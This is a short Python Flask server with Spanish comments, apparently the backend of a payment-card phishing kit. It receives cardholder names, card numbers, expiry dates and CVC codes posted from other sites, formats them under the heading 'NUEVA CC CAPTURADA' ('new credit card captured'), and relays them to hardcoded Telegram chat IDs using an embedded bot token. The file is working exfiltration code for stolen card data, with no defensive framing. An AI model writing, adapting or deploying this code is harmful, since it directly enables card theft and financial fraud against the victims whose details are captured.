import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
# Lista de personas que recibirán la información
LISTA_DE_RECEPTORES = ['6953415010', '7707049896']

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    target_id = str(data.get('target_id'))

    # 1. Validación de seguridad (Solo si el ID está en tu lista)
    if target_id not in LISTA_DE_RECEPTORES:
        return jsonify({"status": "ignored"}), 200

    # 2. Captura de datos directos
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # 3. Construcción del mensaje (Sin buscar banco, directo al grano)
    mensaje = (
        "💰 *NUEVA CC CAPTURADA* 💰\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    # 4. Envío masivo a tus IDs
    exitos = 0
    for receptor in LISTA_DE_RECEPTORES:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": receptor, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200:
                exitos += 1
        except:
            continue

    print(f"✅ Proceso completado. Enviados a {exitos} personas.")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
